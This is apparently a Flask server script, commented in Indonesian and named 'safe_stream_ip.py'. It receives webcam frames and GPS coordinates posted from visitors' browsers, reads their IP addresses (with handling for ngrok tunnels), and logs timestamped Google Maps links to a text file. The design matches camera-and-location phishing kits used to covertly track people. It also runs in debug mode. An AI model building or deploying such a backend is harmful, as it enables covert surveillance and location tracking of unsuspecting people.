# safe_stream_ip.py
# Flask server tanpa tampilan lokal, menerima stream & lokasi + mencatat IP client.

from flask import Flask, request, render_template_string
from datetime import datetime
import cv2
import numpy as np
import os

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 20 * 1024 * 1024  # Batas upload 20 MB

latest_frame = None

def get_client_ip():
    """Ambil IP client dengan aman (mendukung proxy)."""
    if request.headers.get('X-Forwarded-For'):
        # kalau lewat proxy / ngrok
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip


@app.route('/location', methods=['POST'])
def location_endpoint():
    """Terima data lokasi dari client (lat, lon) + catat IP ke result.txt."""
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    if not lat or not lon:
        return 'Invalid data', 400

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = get_client_ip()
    line = f"{ts} - IP: {ip} - https://www.google.com/maps?q={lat},{lon}\n"

    try:
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        print("Gagal tulis lokasi:", e)
        return 'Server error', 500

    print("[LOKASI]", line.strip())
    return 'OK', 200


@app.route('/')
def index():
    # Jika HTML dipisah di file safe_stream_ui.html (seperti sebelumnya)
    if os.path.exists("streamcam.html"):
        return render_template_string(open("streamcam.html", encoding="utf-8").read())
    return "<h3>UI file (streamcam.html) tidak ditemukan.</h3>", 404


@app.route('/stream', methods=['POST'])
def stream_endpoint():
    """Menerima frame (jpeg blob) dari browser dan catat IP pengirim."""
    global latest_frame
    if 'frame' not in request.files:
        return 'No frame provided', 400

    img_file = request.files['frame']
    file_bytes = np.frombuffer(img_file.read(), np.uint8)
    frame = cv2.imdecode(file_bytes, cv2.IMREAD_COLOR)
    if frame is None:
        return 'Cannot decode frame', 400

    latest_frame = frame

    # Log IP pengirim
    ip = get_client_ip()
    print(f"[STREAM] Frame diterima dari {ip} ({frame.shape[1]}x{frame.shape[0]})")

    return '', 204


if __name__ == '__main__':
    app.run(debug=True, threaded=True)
